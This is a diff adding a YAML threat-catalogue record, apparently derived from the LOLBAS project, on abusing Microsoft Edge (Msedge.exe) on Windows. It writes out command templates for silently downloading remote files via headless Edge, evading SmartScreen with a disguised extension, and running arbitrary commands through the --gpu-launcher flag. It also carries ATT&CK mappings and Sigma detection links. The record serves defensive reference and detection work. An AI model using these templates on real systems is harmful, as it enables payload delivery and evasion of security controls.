@@ -1,0 +1,103 @@
+id: lolbas/T1NCaW5hcmllcy9Nc2VkZ2UueW1s/RG93bmxvYWQ/1
+type: binary
+platform: windows
+name: Msedge.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
+  - https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml
+commands:
+- template: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}"
+    > {PATH:.b64}
+  comment: Edge will silently download the file. File extension should be .html and binaries should be
+    encoded.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Msedge/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Msedge.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/Msedge.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Msedge.exe\nDescription: Microsoft Edge browser\nAuthor: mr.d0x\nCreated:\
+        \ 2022-01-20\nCommands:\n  - Command: msedge.exe {REMOTEURL:.exe.txt}\n    Description: Edge will\
+        \ launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended\
+        \ to avoid SmartScreen.\n    Usecase: Download file from the internet\n    Category: Download\n\
+        \    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n  - Command:\
+        \ msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\"\
+        \ > {PATH:.b64}\n    Description: Edge will silently download the file. File extension should\
+        \ be .html and binaries should be encoded.\n    Usecase: Download file from the internet\n   \
+        \ Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10,\
+        \ Windows 11\n  - Command: msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"\n    Description:\
+        \ Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command\n  \
+        \  Usecase: Executes a process under a trusted Microsoft signed binary\n    Category: Execute\n\
+        \    Privileges: User\n    MitreID: T1218.015\n    OperatingSystem: Windows 10, Windows 11\n \
+        \   Tags:\n      - Execute: CMD\nFull_Path:\n  - Path: c:\\Program Files\\Microsoft\\Edge\\Application\\\
+        msedge.exe\n  - Path: c:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\nDetection:\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml\n\
+        Resources:\n  - Link: https://twitter.com/mrd0x/status/1478116126005641220\n  - Link: https://twitter.com/mrd0x/status/1478234484881436672\n\
+        Acknowledgement:\n  - Person: mr.d0x\n    Handle: '@mrd0x'\n"
+      document_sha256: sha256:2babc4b5c42ae644e452dc4ad2a91843cf2513cb1936f4f9666174c36664e8c4
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Msedge/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:b82f814876e52c1868d56be9d3217f17faf19f765fd12004b37221f29d770d85
